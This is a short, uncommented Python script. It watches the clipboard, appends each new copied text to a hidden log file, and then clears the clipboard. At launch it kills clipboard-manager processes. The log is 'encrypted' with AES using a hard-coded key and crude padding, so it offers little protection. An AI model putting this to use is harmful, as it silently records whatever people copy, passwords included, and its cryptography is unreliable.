import pyperclip
import time
import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from datetime import datetime
import psutil

LOG_PATH = os.path.expanduser("~/.tgdk_clipboard/logs/")
LOG_FILE = os.path.join(LOG_PATH, "cliplog.qquap")
KEY = "QQUAp".ljust(32, 'Q').encode('utf-8')

if not os.path.exists(LOG_PATH):
    os.makedirs(LOG_PATH)

def qquap_encrypt(plaintext):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padded = plaintext + ' ' * (16 - len(plaintext) % 16)
    ct = encryptor.update(padded.encode('utf-8')) + encryptor.finalize()
    return base64.b64encode(iv).decode() + "|" + base64.b64encode(ct).decode()

def clear_clipboard():
    pyperclip.copy('')

def get_clipboard():
    try:
        return pyperclip.paste()
    except:
        return ''

def log_event(data):
    encrypted = qquap_encrypt(data)
    with open(LOG_FILE, 'a') as f:
        f.write(encrypted + "\n")

def kill_clipboard_listeners():
    suspects = ['parcellite', 'clipit', 'gpaste', 'klipper', 'copyq']
    for proc in psutil.process_iter(['pid', 'name']):
        if any(x in proc.info['name'].lower() for x in suspects):
            proc.kill()

def monitor_clipboard():
    last_clip = ""
    kill_clipboard_listeners()
    while True:
        try:
            current = get_clipboard()
            if current and current != last_clip:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_event(f"{timestamp} :: Clipboard changed :: {current}")
                clear_clipboard()
                last_clip = ""
        except:
            pass
        time.sleep(1.5)

if __name__ == "__main__":
    monitor_clipboard()